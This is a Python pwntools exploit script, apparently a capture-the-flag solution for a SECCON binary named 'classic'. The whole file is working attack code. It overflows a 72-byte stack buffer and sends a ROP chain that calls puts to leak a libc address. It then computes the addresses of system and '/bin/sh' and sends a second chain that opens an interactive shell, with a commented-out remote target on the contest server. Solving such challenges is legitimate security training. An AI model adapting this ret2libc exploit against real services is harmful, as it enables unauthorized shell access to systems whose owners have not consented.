from pwn import *
elf = ELF("./classic_aa9e979fd5c597526ef30c003bffee474b314e22")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #local libc
libc = ELF("libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253") # server libc
def un64(data):
    return int(data[::-1].encode("hex"),16)

def main():
    r = elf.process() # local run binary
    #r = remote("classic.pwn.seccon.jp",17354) # server run binary
    offset = 72
    puts_libc = 0x000000601018
    main = 0x00000000004006a9
    puts_plt = 0x0000000000400520
    pop_rdi = 0x0000000000400753

    p = "a" * offset
    p += p64(pop_rdi)
    p += p64(puts_libc)
    p += p64(puts_plt)
    p += p64(main)

    r.recvuntil("Local Buffer >> ")
    r.sendline(p)
    r.recvuntil("Have a nice pwn!!")
    leak_puts = un64(r.recv(8).strip())
    print "[!] address memory puts : ",hex(leak_puts)

    # hitung offset
    libc_base = leak_puts - libc.symbols['puts']
    libc_system = libc_base + libc.symbols['system']
    libc_binsh = libc_base + libc.search("/bin/sh").next()

    p2 = "a" * offset
    p2 += p64(pop_rdi)
    p2 += p64(libc_binsh)
    p2 += p64(libc_system)
    p2 += "AAAAAAAA"

    r.recvuntil("Local Buffer >> ")
    r.sendline(p2)
    r.interactive()

if __name__ == '__main__':
    main()
